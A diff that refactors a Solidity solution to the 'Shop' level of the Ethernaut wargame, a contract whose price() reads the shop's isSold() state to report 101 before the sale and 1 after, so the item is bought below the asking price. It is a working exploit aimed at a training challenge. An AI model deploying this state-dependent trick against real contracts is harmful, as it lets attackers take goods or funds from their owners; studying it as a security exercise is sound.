@@ -1,34 +1,29 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.20;
 
 /**
- * @title 21. STOP
+ * @title 21. SHOP
  * @dev Get the item from the shop for less than the price asked.
  */
 
-interface Buyer {
+interface IShop {
     function isSold() external view returns (bool);
 
     function buy() external;
 }
 
-contract Etherenaut_Shop {
-    Buyer buyer = Buyer(0xb6fD536610887837a3452Ac249432bF9eF129e3a); // Replace with your Shop instance
+contract Discount {
+    IShop shop;
 
-    // Custom price() function implementation
+    constructor(address _shop) {
+        shop = IShop(_shop);
+    }
+
     function price() public view returns (uint256) {
-        bool sold = buyer.isSold();
-
-        if (!sold) {
-            return 101; // 1. Let's start by bying the item for 101
-        } else {
-            return 1; // 2. Then set the price to 1 :)
-        }
+        return shop.isSold() ? 1 : 101;
     }
 
     function attack() public {
-        buyer.buy();
+        shop.buy();
     }
 }
-
-// 🎉 Level completed! 🎉
